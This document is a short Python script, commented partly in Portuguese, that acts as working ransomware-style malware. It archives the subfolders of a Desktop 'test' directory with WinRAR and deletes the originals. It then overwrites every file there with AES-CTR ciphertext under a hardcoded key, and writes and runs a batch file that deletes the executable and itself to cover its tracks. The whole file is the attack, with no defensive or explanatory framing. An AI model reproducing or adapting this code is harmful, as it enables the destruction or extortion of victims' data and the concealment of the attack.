import os, pyaes, subprocess, shutil, sys, time

# work folder
desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'test')

# key must be 16, 24 or 32 bytes
key = b'abcdefghijklmnopqrstuvwxyz012345'

# winrar path
winrar_path = r"C:\Program Files\WinRAR\Rar.exe"

# check if winrar is installed
if os.path.exists(winrar_path):
    # 1st compacting the directories
    for i in os.listdir(desktop):
        file_dir = os.path.join(desktop, i)

        if os.path.isdir(file_dir):  # if directory
            rar_path = os.path.join(desktop, f'{i}.rar')  # file.rar

            try:
                subprocess.run(
                    [winrar_path, "a", "-r", rar_path, file_dir], check=True
                )

                # Deleta o diretório após compactação
                shutil.rmtree(file_dir)

            except:
                continue

# 🔹 Passo 2: Criptografar todos os arquivos na pasta (incluindo os .rar, se existirem)
for i in os.listdir(desktop):
    file_dir = os.path.join(desktop, i)

    if os.path.isfile(file_dir):  # Se for um arquivo
        try:
            # Abre e lê o conteúdo do arquivo
            with open(file_dir, 'rb') as f:
                file_data = f.read()

            # Cria uma nova instância do AES para cada arquivo
            aes = pyaes.AESModeOfOperationCTR(key)
            encrypted_data = aes.encrypt(file_data)

            # Sobrescreve o arquivo com os dados criptografados
            with open(file_dir, 'wb') as f:
                f.write(encrypted_data)

        except:
            continue


# bat to del itself
script_dir = os.path.dirname(sys.executable)  # Caminho do .exe

# Caminhos dos arquivos
bat_file = os.path.join(script_dir, "hoe.bat")
del_file = os.path.join(script_dir, os.path.basename(sys.executable))  # O próprio exe

# Criando o arquivo .bat
try:
    with open(bat_file, "w") as f:
        f.write("@echo off\n")
        f.write("timeout /t 2 >nul\n")  # Aguarda 3 segundos
        f.write(f'del /f /q "{del_file}"\n')  # Deleta o .exe
        f.write(f'del /f /q "{bat_file}"\n')  # Se deleta após a execução

    # Executa o arquivo .bat e encerra o programa
    os.system(f'start /min cmd /c "{bat_file}"')
    sys.exit()

except:
    pass